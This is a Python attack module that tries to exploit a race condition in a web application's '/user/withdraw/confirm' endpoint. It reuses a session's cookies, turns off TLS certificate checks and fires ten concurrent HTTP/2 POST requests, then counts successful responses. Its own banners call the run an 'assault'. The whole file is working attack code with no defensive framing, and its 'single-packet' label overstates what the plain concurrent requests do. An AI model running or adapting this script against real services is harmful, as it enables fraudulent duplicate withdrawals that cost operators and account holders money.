#!/usr/bin/env python3
"""
RACE_CONDITION.PY v7.1 — HTTP/2 Single-Packet Concurrency Engine
"""
import asyncio
import sys

async def fire_single_packet_request(client, url, cookies):
    try:
        response = await client.post(url, cookies=cookies, timeout=5.0)
        return response.status_code, response.text
    except Exception:
        return 0, ""

async def run_race_condition_test(target_url, port=443, use_ssl=True, session_pool=None):
    sys.stdout.write("\033[95m[***] INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT [***]\033[0m\n")
    sys.stdout.flush()

    target_endpoint = f"{target_url.rstrip('/')}/user/withdraw/confirm"
    
    # Import httpx safely for async single-packet dispatch
    try:
        import httpx
    except ImportError:
        sys.stdout.write("\033[91m[-] httpx required for race condition concurrency module.\033[0m\n")
        return []

    cookies = dict(session_pool.cookie_jar) if session_pool and hasattr(session_pool, 'cookie_jar') else {}

    # Fire concurrent multiplexed requests over a single TCP connection
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [
            fire_single_packet_request(client, target_endpoint, cookies)
            for _ in range(10)
        ]
        results = await asyncio.gather(*tasks)

    success_hits = 0
    for status, body in results:
        if status in [200, 201, 302]:
            success_hits += 1

    sys.stdout.write(f"\033[92m[+] Race condition assault completed. Concurrent success windows hit: {success_hits}/10\033[0m\n")
    sys.stdout.flush()
    return results

